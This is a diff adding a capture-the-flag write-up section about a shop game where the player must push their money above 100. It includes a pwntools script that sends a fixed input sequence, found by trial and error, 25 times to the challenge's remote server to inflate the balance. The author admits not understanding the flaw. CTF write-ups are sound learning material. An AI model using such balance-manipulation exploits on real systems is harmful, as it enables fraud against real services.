@@ -546,10 +546,60 @@ We can:
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f21b1516-3a15-447f-835b-b8b7bea9ec98)
 
 - Queue upgrade clothes
- 
+
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d602dfc7-aa4a-44ec-9db2-d53db1395ebb)
 
+- Access the flag
 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a43c24c3-21d0-4be8-bdf1-e2131cc3a793)
+
+So basically the idea of this challenge is to get money that's greater than 100 but the problem is that on startup we're given 10money and 1 money is equal to 1 swag
+
+In those functions it can manipulate the amount of money we have mostly decreasing it and trying to make sure whatever we do maybe purchase a cloth it would subtract the price from our input
+
+And some other things but it always make sure we don't try phishy things like using negative numbers
+
+But while I was trying to solve this I was too tired to look at the source code cause it was too intimidating cause it's much
+
+So I started playing with several inputs and eventually after few minutes I was able to increase my money value to be more than 10
+
+I still don't know why or how that works and that's bad maybe I'll look at it again (i didn't care to check why that is so cause of pressure lol)
+
+But once I was able to trigger a set of inputs that would increase the money I had I just wrote a solve script to make the money greater than 100 and get the flag
+
+Here's my solve script: [link]()
+
+```python
+from pwn import *
+
+def sell_cloth():
+    io.sendline('2')
+    io.sendline('y')
+    io.sendline('2')
+    io.sendline('y')
+
+def idk():
+    inp = [1, 5, 3, 0, 5, 2, 'y', 1, 1, 1, 3, 0, 0, 2]
+
+    for i in inp:
+        io.sendline(str(i))
+
+def solve():
+    idk()
+    io.sendline('n')
+    sell_cloth()
+
+# io = process('./yooeyyeff')
+io = remote('0.cloud.chals.io', '33146')
+context.log_level = 'debug'
+
+for i in range(25):
+    solve()
+
+io.sendline('4')
+
+io.interactive()
+```
 
 
 
